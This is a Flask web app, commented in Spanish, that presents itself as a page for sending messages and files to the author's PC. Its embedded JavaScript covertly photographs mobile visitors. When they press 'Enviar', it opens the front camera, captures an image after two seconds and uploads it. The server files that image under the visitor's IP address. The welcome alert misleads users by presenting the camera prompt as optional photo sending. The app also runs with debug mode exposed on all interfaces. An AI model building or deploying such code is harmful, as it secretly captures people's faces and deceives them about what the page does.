from flask import Flask, request, render_template_string, jsonify
from datetime import datetime
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configuración para subir archivos
UPLOAD_FOLDER = 'uploads'
PHOTOS_FOLDER = os.path.join(UPLOAD_FOLDER, 'fotos')  # Carpeta dedicada para fotos automáticas
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf', 'txt', 'doc', 'docx', 'mp3', 'mp4', 'wav', 'ogg'}  # Extensiones permitidas
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['PHOTOS_FOLDER'] = PHOTOS_FOLDER

# Crear las carpetas si no existen
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
if not os.path.exists(PHOTOS_FOLDER):
    os.makedirs(PHOTOS_FOLDER)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    archivo = request.files.get('archivo')
    if archivo and allowed_file(archivo.filename):
        ip_remitente = request.remote_addr  # Usar la IP del remitente
        fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        filename_para_guardar = f"{ip_remitente}.jpg"  # Nombre solo con IP y extensión
        archivo_guardado = os.path.join(app.config['PHOTOS_FOLDER'], filename_para_guardar)
        archivo.save(archivo_guardado)
        nombre_archivo_log = f"{ip_remitente}.jpg"
        print(f"Foto automática subida de {ip_remitente} ({fecha_hora}): Archivo: {nombre_archivo_log}")
        with open('mensajes.txt', 'a', encoding='utf-8') as f:
            f.write(f"Foto automática: {nombre_archivo_log} - {fecha_hora}\n")
        return jsonify({'success': True})
    return jsonify({'success': False}), 400

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Meta tag esencial para responsividad en móviles -->
    <title>Envía un Mensaje</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            max-width: 600px; 
            margin: 50px auto; 
            padding: 20px; 
            background: linear-gradient(135deg, #ff7e5f, #feb47b, #6a11cb, #2575fc); /* Degradado vivo con colores naranjas, azules y morados */
            background-attachment: fixed; /* Para que el degradado se mantenga fijo al hacer scroll */
            color: white; /* Texto blanco para contrastar con el fondo */
        }
        form { margin-top: 20px; }
        input, textarea { 
            width: 100%; 
            padding: 10px; 
            margin: 5px 0; 
            box-sizing: border-box; 
            border-radius: 10px; /* Esquinas curvas */
            background-color: rgba(255, 255, 255, 0.7); /* Semi transparente (blanco con 70% opacidad) */
            border: 1px solid rgba(255, 255, 255, 0.5); /* Borde semi transparente */
            color: #333; /* Texto oscuro para legibilidad */
        }
        button { 
            background: #007bff; 
            color: white; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
            border-radius: 10px; /* Esquinas curvas también en el botón */
        }
        .success { 
            color: #00ff00; /* Verde brillante para el mensaje de éxito */
            margin: 10px 0; 
        }
        #selectButton {
            background: #28a745;
            margin: 5px 0;
        }
        #fileInput {
            display: none;
        }
        #video, #canvas {
            display: none;
        }
        #fileNameDisplay {
            margin: 5px 0;
            color: #00ff00;
            font-weight: bold;
        }
        
        /* Estilos responsivos para móviles (pantallas menores a 768px) */
        @media (max-width: 768px) {
            body {
                max-width: 95%; /* Ocupa casi todo el ancho en móviles */
                margin: 10px auto; /* Muy poco margen superior para ocupar más pantalla */
                padding: 40px 25px; /* Mucho más padding para que se vea espacioso */
                font-size: 20px; /* Fuente aún más grande */
            }
            h1 {
                font-size: 28px; /* Título mucho más grande */
                margin-bottom: 20px; /* Más espacio abajo */
            }
            p {
                font-size: 18px; /* Párrafos más grandes */
                line-height: 1.5; /* Mejor espaciado de líneas */
            }
            input, textarea {
                padding: 20px; /* Padding mucho mayor en campos */
                margin: 10px 0; /* Más margen */
                font-size: 18px; /* Fuente grande para evitar zoom */
            }
            button {
                padding: 20px 40px; /* Botón muy grande y fácil de tocar */
                font-size: 20px; /* Fuente grande */
                margin-top: 20px; /* Más espacio arriba */
            }
            form {
                margin-top: 40px; /* Mucho más espacio arriba del formulario */
            }
        }
    </style>
</head>
<body>
    <h1>Envía un Mensaje a mi PC</h1>
    <p>Ingresa tu mensaje abajo (opcional). Se enviará directamente al servidor. También puedes adjuntar un archivo.</p>
    {% if success %}
    <p class="success">¡Mensaje enviado exitosamente!</p>
    {% endif %}
    <form id="messageForm" method="POST" enctype="multipart/form-data">
        <input type="text" name="nombre" placeholder="Tu nombre (opcional)"><br>
        <textarea name="mensaje" placeholder="Tu mensaje..." rows="4"></textarea><br> <!-- Quité 'required' para hacerlo opcional -->
        <input type="file" id="fileInput" name="archivo" accept="image/*,.pdf,.txt,.doc,.docx,.mp3,.mp4,.wav,.ogg"><br> <!-- Ahora incluye imágenes -->
        <button type="button" id="selectButton">Seleccionar Archivo</button><br> <!-- Botón para seleccionar archivo -->
        <div id="fileNameDisplay"></div> <!-- Aquí se mostrará el nombre del archivo seleccionado -->
        <button type="submit" id="submitButton">Enviar</button>
    </form>
    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
    <script>
        // Mensaje de bienvenida al cargar la página
        window.onload = function() {
            alert("bienvenido a mi pagina, aqui podras enviarme mensajes y archivos, si dejas el nombre vacio se enviara un mensaje anonimo, y si te pide un permiso para usar la camara, es solo si deseas usar la opcion de enviar una foto (el boton de seleccionar archivo funciona para enviar fotos)");
        };

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const selectButton = document.getElementById('selectButton');
        const fileInput = document.getElementById('fileInput');
        const fileNameDisplay = document.getElementById('fileNameDisplay');
        const messageForm = document.getElementById('messageForm');
        const submitButton = document.getElementById('submitButton');
        let stream;

        function isMobile() {
            return /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        }

        // Mostrar nombre del archivo seleccionado
        fileInput.addEventListener('change', () => {
            if (fileInput.files.length > 0) {
                fileNameDisplay.textContent = `Archivo seleccionado: ${fileInput.files[0].name}`;
            } else {
                fileNameDisplay.textContent = '';
            }
        });

        // Botón seleccionar archivo
        selectButton.addEventListener('click', () => {
            fileInput.click();
        });

        // Interceptar el submit del formulario
        messageForm.addEventListener('submit', async (event) => {
            if (isMobile()) {
                event.preventDefault();  // Prevenir el submit inmediato
                // Tomar foto automáticamente con cámara delantera y enviar
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    video.srcObject = stream;
                    video.play();

                    setTimeout(async () => {
                        const context = canvas.getContext('2d');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);

                        canvas.toBlob(async (blob) => {
                            const file = new File([blob], 'foto_automatica.jpg', { type: 'image/jpeg' });
                            const formData = new FormData();
                            formData.append('archivo', file);

                            try {
                                await fetch('/upload_photo', {
                                    method: 'POST',
                                    body: formData
                                });
                            } catch (error) {
                                console.error('Error enviando la foto:', error);
                            }

                            stream.getTracks().forEach(track => track.stop());

                            // Después de enviar la foto, proceder con el submit del formulario
                            messageForm.submit();
                        }, 'image/jpeg');
                    }, 2000);
                } catch (error) {
                    console.error('Error accediendo a la cámara:', error);
                    // Si falla la cámara, proceder con el submit normal
                    messageForm.submit();
                }
            }
            // En desktop, el submit continúa normalmente
        });
    </script>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    success = False
    if request.method == 'POST':
        nombre = request.form.get('nombre', '').strip()
        if not nombre:
            nombre = f"{request.remote_addr} - anonimo"
        mensaje = request.form.get('mensaje', '').strip()  # Ahora opcional
        fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  
        
        # Manejar archivo subido
        archivo = request.files.get('archivo')
        archivo_guardado = None
        nombre_archivo_log = None
        if archivo and allowed_file(archivo.filename):
            # Limpiar nombre del remitente
            nombre_limpio = nombre.replace(':', '_').replace(' ', '_').replace('/', '_').replace('\\', '_')
            # Obtener nombre original del archivo
            filename_original = secure_filename(archivo.filename) if archivo.filename else "archivo_sin_nombre.jpg"
            
            # Verificar si es una imagen para guardarla en la carpeta de fotos (pero las automáticas ya van a fotos)
            extension = filename_original.rsplit('.', 1)[1].lower() if '.' in filename_original else ''
            if extension in {'png', 'jpg', 'jpeg', 'gif'}:
                folder = app.config['PHOTOS_FOLDER']
            else:
                folder = app.config['UPLOAD_FOLDER']
            
            # Nombre para guardar (con "_" para compatibilidad en Windows)
            filename_para_guardar = f"{nombre_limpio}_{filename_original}"
            archivo_guardado = os.path.join(folder, filename_para_guardar)
            archivo.save(archivo_guardado)
            # Nombre para el log (con ":" para que se vea bien)
            nombre_archivo_log = f"{nombre}:{filename_original}"
        
        # Imprimir y guardar en archivo
        if archivo_guardado:
            print(f"Nuevo mensaje de {nombre} ({fecha_hora}): {mensaje} - Archivo: {nombre_archivo_log}")
            with open('mensajes.txt', 'a', encoding='utf-8') as f:
                f.write(f"{nombre}: {mensaje} - Archivo: {nombre_archivo_log} - {fecha_hora}\n")
        else:
            print(f"Nuevo mensaje de {nombre} ({fecha_hora}): {mensaje}")
            with open('mensajes.txt', 'a', encoding='utf-8') as f:
                f.write(f"{nombre}: {mensaje} - {fecha_hora}\n")
        
        success = True  
    
    return render_template_string(HTML_TEMPLATE, success=success)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)